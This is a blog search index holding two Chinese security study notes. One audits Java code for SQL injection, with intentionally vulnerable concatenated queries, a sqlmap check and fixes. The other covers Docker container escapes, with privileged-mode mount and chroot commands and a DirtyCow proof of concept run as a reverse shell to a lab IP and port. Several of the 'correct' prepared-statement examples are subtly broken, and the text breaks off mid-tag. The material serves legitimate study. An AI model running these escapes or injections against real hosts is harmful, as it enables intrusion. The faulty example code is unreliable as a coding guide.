<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java代审--Sql注入</title>
      <link href="/2023/10/21/Java%E4%BB%A3%E5%AE%A1--Sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/10/21/Java%E4%BB%A3%E5%AE%A1--Sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Java中的数据库操作"><a href="#Java中的数据库操作" class="headerlink" title="Java中的数据库操作"></a>Java中的数据库操作</h1><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><p>原始</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line"><span class="comment">//正确设置时区，否则会报错</span></span><br><span class="line"><span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&amp;serverTimezone=UTC&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line">Class.forName(CLASS_NAME);<span class="comment">// 注册JDBC驱动类</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure><p>Datasource</p><blockquote><p>使用Java程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。</p><p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p></blockquote><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">123</span></span><br><span class="line"><span class="attr">spring.datasource.type</span>=<span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure><h3 id="查询函数"><a href="#查询函数" class="headerlink" title="查询函数"></a>查询函数</h3><h4 id="statement-executeQuery"><a href="#statement-executeQuery" class="headerlink" title="statement.executeQuery()"></a>statement.executeQuery()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231020230554466.png" alt="image-20231020230554466"></p><h4 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h4><p>PrepareStatement会对SQL语句进行<strong>预编译</strong></p><p>传参<code>&#39;admin</code>‘</p><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>预编译会对传入的参数自动<strong>加上一对单引号</strong>，并对参数值进行<strong>转义操作</strong></p><h3 id="预编译使用"><a href="#预编译使用" class="headerlink" title="预编译使用"></a>预编译使用</h3><ul><li><p>单个参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql=<span class="string">&quot;select * from user where name=?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="number">1</span>,username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure></li><li><p>in语句</p><p>在in当中使用拼接而不使用占位符做预编译的原因是因为很多时候无法确定范围里含有多少个对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">gradeDelete</span><span class="params">(Connection con, String delIds)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">num</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//将对象分割开来,根据实际传参情况进行分割</span></span><br><span class="line">    String[] spl = delIds.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据对象的个数添加同量的占位符?,用来预编译</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt; spl.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">            num += <span class="string">&quot;?&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            num += <span class="string">&quot;.?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;delete from users where id in(&quot;</span>+num+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="type">prepareStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; spl.length; j++)&#123;</span><br><span class="line">            pstmt.setInt(j+<span class="number">1</span>, integer.parseint(spl[j]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pstmt.executeUpdate();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>like语句</p><p><strong>正确的写法</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users like ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="string">&quot;txf&quot;</span>,<span class="string">&quot;%&quot;</span>+username+<span class="string">&quot;%&quot;</span>);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">    </span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users like concat(&#x27;%&#x27;,?,&#x27;%&#x27;)&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="string">&quot;txf&quot;</span>,username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021103743908.png" alt="image-20231021103743908"></p><p><strong>错误的写法</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users like %?%&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="number">1</span>,username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021103421175.png" alt="image-20231021103421175"></p></li></ul><p>当然对于<code>order by</code>这种使用了预编译会导致Sql语句失效的地方，还是需要手动写黑白名单的过滤才可以。</p><h2 id="Hibernate框架"><a href="#Hibernate框架" class="headerlink" title="Hibernate框架"></a>Hibernate框架</h2><blockquote><p>Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。</p><p>Hibernate可以使用hql来执行SQL语句，也可以直接执行SQL语句，无论是哪种方式都有可能导致SQL注入</p></blockquote><h3 id="Sql查询"><a href="#Sql查询" class="headerlink" title="Sql查询"></a>Sql查询</h3><p><strong>HQL语句</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> <span class="string">&quot;from People where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Query</span> <span class="variable">query</span> <span class="operator">=</span> session.createQuery(hql);</span><br><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> query.list();</span><br><span class="line">System.out.println(list);</span><br></pre></td></tr></table></figure><p><strong>Sql语句</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Query&lt;People&gt; query = session.createNativeQuery(<span class="string">&quot;select * from user where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="预编译使用-1"><a href="#预编译使用-1" class="headerlink" title="预编译使用"></a>预编译使用</h3><h4 id="命名参数（named-parameter"><a href="#命名参数（named-parameter" class="headerlink" title="命名参数（named parameter"></a>命名参数（named parameter</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users name = :name&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>, parameter);</span><br></pre></td></tr></table></figure><h4 id="位置参数（Positional-parameter）"><a href="#位置参数（Positional-parameter）" class="headerlink" title="位置参数（Positional parameter）"></a>位置参数（Positional parameter）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users name = ?&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="number">0</span>, parameter);</span><br></pre></td></tr></table></figure><h4 id="命名参数列表（named-parameter-list）"><a href="#命名参数列表（named-parameter-list）" class="headerlink" title="命名参数列表（named parameter list）"></a>命名参数列表（named parameter list）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;222&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users where name in (:names)&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;names&quot;</span>, names);</span><br></pre></td></tr></table></figure><h4 id="类实例（JavaBean）"><a href="#类实例（JavaBean）" class="headerlink" title="类实例（JavaBean）"></a>类实例（JavaBean）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">user1.setName(<span class="string">&quot;khaz&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users where name =:name&quot;</span>, User.class);</span><br><span class="line">query.setProperties(user1);</span><br></pre></td></tr></table></figure><h2 id="Mybatis框架"><a href="#Mybatis框架" class="headerlink" title="Mybatis框架"></a>Mybatis框架</h2><blockquote><p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p></blockquote><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="基于注解"><a href="#基于注解" class="headerlink" title="基于注解"></a>基于注解</h4><p><code>dao</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要么在每一个<code>dao</code>上加上<code>@Mapper</code>，或者不加然后在启动类加上<code>@MapperScan(&quot;dao所在的包&quot;)</code></p></blockquote><p><code>entity</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Controller</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/mybatis&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDemo</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/sql&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.queryByName(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基于XML"><a href="#基于XML" class="headerlink" title="基于XML"></a>基于XML</h4><p>主要区别在于sql语句一个是写在Mapper注解，一个是写在XML中</p><p><code>mapper</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- namespace值为dao --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.itheima.springbootmybatis.mapper.UserXmlMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- id对应接口方法名 resultType对应实体 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>dao</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserXmlMapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>映射关系</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*Mapper.xml</span> <span class="comment"># mapper映射文件路径</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.itheima.springbootmybatis.domain</span></span><br></pre></td></tr></table></figure><p><code>entity</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Controller</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/mybatis&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDemo</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/sql&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.queryByName(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h3><p>Mybatis下有两种传参方式，分别是<code>$&#123;&#125;</code>以及<code>#&#123;&#125;</code></p><h4 id="传参"><a href="#传参" class="headerlink" title="${}传参"></a><code>$&#123;&#125;</code>传参</h4><p>使用<code>$&#123;&#125;</code>的方式传参，mybatis是将传入的参数<strong>直接拼接</strong>到SQL语句上</p><p>Mapper</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from user where name = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">queryByName</span><span class="params">(String username)</span>;</span><br></pre></td></tr></table></figure><p>Controller</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/sql&quot;)</span>    </span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;        </span><br><span class="line"><span class="keyword">return</span> userMapper.queryByName(username);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021133037285.png" alt="image-20231021133037285"></p><h4 id="传参-1"><a href="#传参-1" class="headerlink" title="#{}传参"></a><code>#&#123;&#125;</code>传参</h4><p>使用<code>#&#123;&#125;</code>传参则相当于使用了预编译，相当于<code>?</code>占位符</p><p>Mapper</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from user where name = #&#123;username&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">queryByName</span><span class="params">(String username)</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021134416037.png" alt="image-20231021134416037"></p><p><img src="/../images/image-20231021134353209.png" alt="image-20231021134353209"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>可能存在的sql注入点</strong></p><p>DAO: 存在拼接的SQL语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String sql=&quot;select * from user where id=&quot;+id</span><br></pre></td></tr></table></figure><p>Hibernate框架</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.createQuery(&quot;from Book where title like &#x27;%&quot; + userInput + &quot;%&#x27; and published = true&quot;)</span><br></pre></td></tr></table></figure><p>Mybatis框架</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Select * from news where title like <span class="title function_">concat</span><span class="params">(<span class="string">&quot;%&quot;</span>+<span class="string">&quot;$&#123;title&#125;&quot;</span>+<span class="string">&quot;%&quot;</span>)</span></span><br><span class="line">Select * from news where id <span class="title function_">in</span> <span class="params">($&#123;id&#125;)</span>，</span><br><span class="line">Select * from news <span class="type">where</span> <span class="variable">title</span> <span class="operator">=</span><span class="string">&#x27;java&#x27;</span> order by $&#123;time&#125; asc</span><br></pre></td></tr></table></figure><p>⚠️ 注意并不是全部的参数拼接都会产生漏洞的，有以下几种情况是不存在SQL注入的：</p><ul><li><p>param不可控</p></li><li><p>param不是字符类型，比如说parameter为int类型，只能传入数字，就没法产生SQL注入</p></li><li><p>param在传递过程中被转义或过滤，比如filter过滤器</p></li></ul><p><strong>修复</strong></p><ul><li>正确使用预编译,如占位符问题，Mybatis框架使用<code>#&#123;&#125;</code></li><li>不能预编译的地方如Order By，可以加filter来进行黑名单过滤</li></ul><h1 id="Spring-Boot项目挖掘"><a href="#Spring-Boot项目挖掘" class="headerlink" title="Spring Boot项目挖掘"></a>Spring Boot项目挖掘</h1><h2 id="观察项目使用了哪一种方法来操作数据库"><a href="#观察项目使用了哪一种方法来操作数据库" class="headerlink" title="观察项目使用了哪一种方法来操作数据库"></a>观察项目使用了哪一种方法来操作数据库</h2><p>从<code>POM.XML</code>中可以看到使用了Mybatis框架</p><p><img src="/../images/image-20231026154200895.png" alt="image-20231026154200895"></p><h2 id="搜索相关关键词，找到可能存在的点"><a href="#搜索相关关键词，找到可能存在的点" class="headerlink" title="搜索相关关键词，找到可能存在的点"></a>搜索相关关键词，找到可能存在的点</h2><p>如Mybatis框架就搜索<code>$&#123;</code>，可以看到这里因为是like模糊查询所以使用了<code>$&#123;&#125;</code>来进行拼接</p><p><img src="/../images/image-20231026154322869.png" alt="image-20231026154322869"></p><h2 id="逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为Mapper-gt-Dao-gt-ServiceImpl-gt-Controller"><a href="#逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为Mapper-gt-Dao-gt-ServiceImpl-gt-Controller" class="headerlink" title="逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为Mapper -&gt; Dao -&gt; ServiceImpl -&gt; Controller"></a>逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为<code>Mapper -&gt; Dao -&gt; ServiceImpl -&gt; Controller</code></h2><p>搜索得到有两处查询使用了<code>$&#123;&#125;</code>来进行拼接</p><p><img src="/../images/image-20231026160243330.png" alt="image-20231026160243330"></p><p><img src="/../images/image-20231026160308494.png" alt="image-20231026160308494"></p><p>通过<code>namespace</code>可以找到对应的<code>Dao</code></p><p><img src="/../images/image-20231026160357396.png" alt="image-20231026160357396"></p><p>在<code>Dao</code>中找到对应方法，</p><p><img src="/../images/image-20231026160600815.png" alt="image-20231026160600815"></p><p><code>find usages</code>跳转到对应实现</p><p><img src="/../images/image-20231026160811957.png" alt="image-20231026160811957"></p><p>再次追踪该方法调用，来到<code>Crontroller</code>层</p><p><img src="/../images/image-20231026160856177.png" alt="image-20231026160856177"></p><p>所属类</p><p><img src="/../images/image-20231026161030565.png" alt="image-20231026161030565"></p><p>所以有如下请求</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin/goods/list?page=xx&amp;limit=xx&amp;goodsName=</span><br></pre></td></tr></table></figure><p>使用sqlmap验证</p><p><img src="/../images/image-20231026171348504.png" alt="image-20231026171348504"></p><p>另一处也是如此分析</p><p><img src="/../images/image-20231026171528715.png" alt="image-20231026171528715"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>本次较为简单，因为没有过滤的存在，主要是学习如何寻找以及数据的流向。</p><p>那么对于SQL注入的审计，如Mybatis框架先在Mapper中搜寻是否存在<code>$&#123;&#125;</code>拼接的情况，尤其注意order by、group by、like、in。找到拼接后再逆向追踪参数，判断参数是否可控，是否是字符类型，检查是否存在过滤器过滤SQL字符。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux渗透总结</title>
      <link href="/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h1><h2 id="如何判断是否在docker容器内"><a href="#如何判断是否在docker容器内" class="headerlink" title="如何判断是否在docker容器内"></a>如何判断是否在docker容器内</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /.dockerenv</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901114550082.png?lastModify=1695029992" alt="image-20230901114550082"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901114605623.png?lastModify=1695029992" alt="image-20230901114605623"></p><p>docker容器逃逸检测脚本<a href="https://github.com/teamssix/container-escape-check">teamssix&#x2F;container-escape-check: docker container escape check || Docker 容器逃逸检测 (github.com)</a></p><h2 id="常见逃逸方法"><a href="#常见逃逸方法" class="headerlink" title="常见逃逸方法"></a>常见逃逸方法</h2><p><a href="http://124.220.192.120:7777/CloudNative/Docker/">Docker 介绍 | T Wiki</a></p><h3 id="Docker-Remote-API-未授权逃逸"><a href="#Docker-Remote-API-未授权逃逸" class="headerlink" title="Docker Remote API 未授权逃逸"></a>Docker Remote API 未授权逃逸</h3><p>docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker。</p><p><img src="/../images/image-20231023182901150.png" alt="image-20231023182901150"></p><p><img src="/../images/image-20231023182819832.png" alt="image-20231023182819832"></p><h3 id="Privileged-特权模式容器逃逸"><a href="#Privileged-特权模式容器逃逸" class="headerlink" title="Privileged 特权模式容器逃逸"></a>Privileged 特权模式容器逃逸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run -itd --privileged ubuntu:latest /bin/bash <span class="comment"># 使用特权模式启动容器</span></span><br><span class="line">fdisk -l <span class="comment"># 查看磁盘文件</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/test <span class="comment"># 创建挂载目录</span></span><br><span class="line">mount /dev/sda1 /tmp/test <span class="comment"># 将宿主机磁盘挂载到挂载目录</span></span><br><span class="line"><span class="built_in">chroot</span> /tmp/test <span class="comment"># 切换根目录</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231023183310012.png" alt="image-20231023183310012"></p><p><img src="/../images/image-20231023183617812.png" alt="image-20231023183617812"></p><h3 id="敏感目录挂载逃逸"><a href="#敏感目录挂载逃逸" class="headerlink" title="敏感目录挂载逃逸"></a>敏感目录挂载逃逸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> <span class="comment"># 显示文件系统的磁盘空间使用情况，包括文件系统的挂载点</span></span><br></pre></td></tr></table></figure><p>以挂载了宿主机<code>/root</code>到容器<code>/root</code>为例</p><p><img src="/../images/image-20231023185041650.png" alt="image-20231023185041650"></p><h3 id="宿主机内核漏洞导致逃逸"><a href="#宿主机内核漏洞导致逃逸" class="headerlink" title="宿主机内核漏洞导致逃逸"></a>宿主机内核漏洞导致逃逸</h3><p><a href="https://blog.wohin.me/posts/dirtycow-for-escape/">CVE-2016-5195实验：DirtyCoW与Docker逃逸 (wohin.me)</a></p><p>Pyaload：<a href="https://github.com/scumjr/dirtycow-vdso">scumjr&#x2F;dirtycow-vdso: PoC for Dirty COW (CVE-2016-5195) (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./0xdeadbeef 172.18.0.2:10000</span><br></pre></td></tr></table></figure><p><strong>由于最后获得的事实上是一个反弹shell，所以要给出反弹的IP和端口。端口可以随意设置，IP可以用<code>ifconfig</code>查看。</strong></p><p><img src="/../images/FE062CE3-C428-4889-ABF2-3423CB1D9D28.png" alt="FE062CE3-C428-4889-ABF2-3423CB1D9D28"></p><p><img src="/../images/5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412.png" alt="5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412"></p><p><img src="/../images/0E89C848-0E3B-4AFD-B035-F8D46CE032F3.png" alt="0E89C848-0E3B-4AFD-B035-F8D46CE032F3"></p><h2 id="集成工具"><a href="#集成工具" class="headerlink" title="集成工具"></a>集成工具</h2><p><a href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">CDK Home CN · cdk-team&#x2F;CDK Wiki (github.com)</a></p><p>CDK包括三个功能模块</p><ol><li>Evaluate: 容器内部信息收集，以发现潜在的弱点便于后续利用。</li><li>Exploit: 提供容器逃逸、持久化、横向移动等利用方式。</li><li>Tool: 修复渗透过程中常用的linux命令以及与Docker&#x2F;K8s API交互的命令。</li></ol><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="https://github.com/teamssix/awesome-cloud-security">teamssix&#x2F;awesome-cloud-security: awesome cloud security 收集一些国内外不错的云安全资源，该项目主要面向国内的安全人员 (github.com)</a><a href="https://github.com/source-xu/docker-vuls">https://github.com/source-xu/docker-vuls</a>)</p><p><a 